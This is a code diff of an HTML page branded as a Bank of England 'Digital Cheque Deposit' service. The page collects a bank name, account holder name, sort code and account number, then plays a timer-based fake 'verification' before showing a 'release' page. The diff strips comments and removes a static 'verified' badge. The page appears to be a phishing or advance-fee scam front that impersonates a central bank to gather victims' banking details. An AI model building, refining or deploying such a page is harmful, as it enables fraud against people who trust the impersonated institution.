@@ -23,7 +23,7 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* Main card - perfectly responsive */
+        
         .card {
             max-width: 880px;
             width: 100%;
@@ -47,11 +47,11 @@
             }
         }
 
-        /* Pages */
+        
         .page { display: block; }
         .page.hidden { display: none; }
 
-        /* Header with logo - BIGGER LOGO NOW */
+        
         .header-row {
             display: flex;
             flex-direction: column;
@@ -74,21 +74,21 @@
             flex-wrap: wrap;
         }
 
-        /* BIGGER LOGO STYLES */
+        
         .boe-logo {
-            height: 70px;  /* INCREASED FROM 40px TO 70px */
+            height: 70px;  
             width: auto;
             object-fit: contain;
         }
 
         @media (max-width: 480px) {
             .boe-logo {
-                height: 50px;  /* BIGGER ON MOBILE TOO (was 32px) */
+                height: 50px;  
             }
         }
 
         .title-small {
-            font-size: 0.8rem;  /* SLIGHTLY BIGGER */
+            font-size: 0.8rem;  
             letter-spacing: 0.2em;
             text-transform: uppercase;
             color: #b29479;
@@ -125,7 +125,7 @@
             line-height: 1.6;
         }
 
-        /* Amount card - responsive */
+        
         .amount-card {
             background: #f2eae2;
             border-radius: 2rem;
@@ -187,7 +187,7 @@
             padding-top: 0.75rem;
         }
 
-        /* Progress steps - FIXED for mobile */
+        
         .progress-steps {
             display: flex;
             flex-direction: column;
@@ -248,7 +248,7 @@
             font-weight: 350;
         }
 
-        /* Step label */
+        
         .step-label {
             font-size: 0.7rem;
             letter-spacing: 0.2em;
@@ -256,7 +256,7 @@
             margin-bottom: 1.25rem;
         }
 
-        /* Main grid - FIXED for mobile */
+        
         .grid-container {
             display: flex;
             flex-direction: column;
@@ -276,7 +276,7 @@
             }
         }
 
-        /* Form fields */
+        
         .field-group {
             margin-bottom: 1.25rem;
         }
@@ -309,7 +309,7 @@
             box-shadow: 0 0 0 3px #f0e2d6;
         }
 
-        /* Custom select - PREMIUM */
+        
         .custom-select {
             position: relative;
             width: 100%;
@@ -411,7 +411,7 @@
             color: #b29479;
         }
 
-        /* Verified badge */
+        
         .verified-badge {
             display: inline-flex;
             align-items: center;
@@ -426,7 +426,7 @@
             margin-left: 1rem;
         }
 
-        /* Verification gallery - FIXED for mobile */
+        
         .gallery {
             margin: 1.5rem 0 1rem;
             border-top: 2px solid #f0e5dc;
@@ -519,7 +519,7 @@
             word-break: break-word;
         }
 
-        /* Buttons */
+        
         .button-group {
             display: flex;
             flex-wrap: wrap;
@@ -555,7 +555,7 @@
             color: #5f554b;
         }
 
-        /* Summary panel - responsive */
+        
         .summary-panel {
             background: #f2eae2;
             border-radius: 2rem;
@@ -592,7 +592,7 @@
             margin-top: 1rem;
         }
 
-        /* Release page - responsive */
+        
         .release-card {
             background: #f2eae2;
             border-radius: 2rem;
@@ -660,13 +660,13 @@
 <body>
     <div class="card">
         <div class="card-inner">
-            <!-- PAGE 1 -->
+            
             <div id="page1" class="page">
-                <!-- Header with LARGE Bank of England logo -->
+                
                 <div class="header-row">
                     <div>
                         <div class="logo-area">
-                            <!-- MUCH BIGGER LOGO - 70px height -->
+                            
                             <img class="boe-logo" src="logob.png" alt="Bank of England">
                             <span class="title-small">DIGITAL CHEQUE DEPOSIT</span>
                         </div>
@@ -681,7 +681,7 @@
                     </div>
                 </div>
 
-                <!-- Progress steps -->
+                
                 <div class="progress-steps">
                     <div class="step-item completed">
                         <div class="step-marker">✓</div>
@@ -697,13 +697,13 @@
                     </div>
                 </div>
 
-                <!-- Step 2 of 3 -->
+                
                 <div class="step-label">Step 2 of 3</div>
 
-                <!-- Main grid -->
+                
                 <div class="grid-container">
                     <div class="grid-left">
-                        <!-- Receiving bank - custom select -->
+                        
                         <div class="field-group">
                             <div class="field-label">RECEIVING BANK</div>
                             <div class="custom-select" id="customSelect">
@@ -736,26 +736,25 @@
                             </div>
                         </div>
 
-                        <!-- Account holder name -->
+                        
                         <div class="field-group">
                             <div class="field-label">ACCOUNT HOLDER NAME</div>
                             <input class="field-box" type="text" id="holderName" value="">
                         </div>
 
-                        <!-- SWIFT / Sort code -->
+                      
                         <div class="field-group">
                             <div class="field-label">SWIFT / SORT CODE</div>
                             <input class="field-box" type="text" id="sortCode" value="">
                         </div>
 
-                        <!-- Account number -->
+                       
                         <div class="field-group">
                             <div class="field-label">ACCOUNT NUMBER</div>
                             <input class="field-box" type="text" id="accountNumber" value="">
-                            <span class="verified-badge">✓ Account number verified</span>
                         </div>
 
-                        <!-- Verification gallery -->
+                       
                         <div class="gallery">
                             <div class="gallery-header" id="galleryHeader">
                                 <h4>Verification status</h4>
@@ -785,7 +784,7 @@
                             </div>
                         </div>
 
-                        <!-- Buttons -->
+                    
                         <div class="button-group">
                             <button class="btn btn-outline" id="cancelBtn">Cancel</button>
                             <button class="btn btn-primary" id="verifyBtn">Verify now</button>
@@ -793,7 +792,7 @@
                         </div>
                     </div>
 
-                    <!-- Right panel - Summary -->
+                   
                     <div class="grid-right">
                         <div class="summary-panel">
                             <h3 style="font-size: 1.1rem; margin-bottom: 1rem;">Recipient summary</h3>
@@ -819,12 +818,12 @@
                 </div>
             </div>
 
-            <!-- PAGE 2 - RELEASE (hidden initially) -->
+            
             <div id="page2" class="page hidden">
                 <div class="header-row" style="margin-bottom: 1rem;">
                     <div>
                         <div class="logo-area">
-                            <!-- MUCH BIGGER LOGO ON PAGE 2 TOO -->
+                            
                             <img class="boe-logo" src="logob.png" alt="Bank of England">
                             <span class="title-small">DIGITAL CHEQUE DEPOSIT</span>
                         </div>
@@ -889,7 +888,7 @@
             const page1 = document.getElementById('page1');
             const page2 = document.getElementById('page2');
             
-            // Custom select
+            
             const trigger = document.getElementById('selectTrigger');
             const dropdown = document.getElementById('selectDropdown');
             const chevron = document.getElementById('chevron');
@@ -897,46 +896,46 @@
             const bankOptions = document.querySelectorAll('.bank-option');
             const bankSearch = document.getElementById('bankSearch');
             
-            // Inputs
+            
             const holderName = document.getElementById('holderName');
             const sortCode = document.getElementById('sortCode');
             const accountNumber = document.getElementById('accountNumber');
             
-            // Summary elements
+            
             const sumBank = document.getElementById('sumBank');
             const sumHolder = document.getElementById('sumHolder');
             const sumSort = document.getElementById('sumSort');
             const sumAcc = document.getElementById('sumAcc');
             
-            // Gallery values
+            
             const gBankVal = document.getElementById('gBankVal');
             const gHolderVal = document.getElementById('gHolderVal');
             const gSortVal = document.getElementById('gSortVal');
             const gAccVal = document.getElementById('gAccVal');
             
-            // Release values
+            
             const relBank = document.getElementById('relBank');
             const relSort = document.getElementById('relSort');
             const relAcc = document.getElementById('relAcc');
             
-            // Icons
+            
             const iconBank = document.getElementById('iconBank');
             const iconHolder = document.getElementById('iconHolder');
             const iconSort = document.getElementById('iconSort');
             const iconAcc = document.getElementById('iconAcc');
             
-            // Buttons
+            
             const verifyBtn = document.getElementById('verifyBtn');
             const confirmBtn = document.getElementById('confirmBtn');
             const cancelBtn = document.getElementById('cancelBtn');
             const backBtn = document.getElementById('backBtn');
             
-            // Gallery
+            
             const galleryHeader = document.getElementById('galleryHeader');
             const galleryItems = document.getElementById('galleryItems');
             const galleryArrow = document.getElementById('galleryArrow');
 
-            // Toggle dropdown
+            
             trigger.addEventListener('click', (e) => {
                 e.stopPropagation();
                 dropdown.classList.toggle('open');
@@ -944,7 +943,7 @@
                 chevron.classList.toggle('open');
             });
 
-            // Select bank
+            
             bankOptions.forEach(option => {
                 option.addEventListener('click', () => {
                     const value = option.getAttribute('data-value');
@@ -958,7 +957,7 @@
                 });
             });
 
-            // Search
+            
             bankSearch.addEventListener('input', (e) => {
                 const term = e.target.value.toLowerCase();
                 bankOptions.forEach(opt => {
@@ -966,7 +965,7 @@
                 });
             });
 
-            // Close dropdown when clicking outside
+            
             document.addEventListener('click', (e) => {
                 if (!trigger.contains(e.target) && !dropdown.contains(e.target)) {
                     dropdown.classList.remove('open');
@@ -975,7 +974,7 @@
                 }
             });
 
-            // Gallery toggle
+            
             galleryHeader.addEventListener('click', () => {
                 if (galleryItems.classList.contains('expanded')) {
                     galleryItems.classList.remove('expanded');
@@ -986,7 +985,7 @@
                 }
             });
 
-            // Update all values
+            
             function updateAll() {
                 const bank = selectedBankText.textContent;
                 const holder = holderName.value || '—';
@@ -1012,7 +1011,7 @@
             sortCode.addEventListener('input', updateAll);
             accountNumber.addEventListener('input', updateAll);
             
-            // Reset icons
+            
             function resetIcons() {
                 [iconBank, iconHolder, iconSort, iconAcc].forEach(ic => {
                     ic.className = 'status-dot';
@@ -1022,7 +1021,7 @@
             }
             resetIcons();
 
-            // Verification sequence
+            
             let timers = [];
             verifyBtn.addEventListener('click', () => {
                 timers.forEach(t => clearTimeout(t));
@@ -1078,6 +1077,7 @@
 </body>
 
 </html>
+
 
 
 
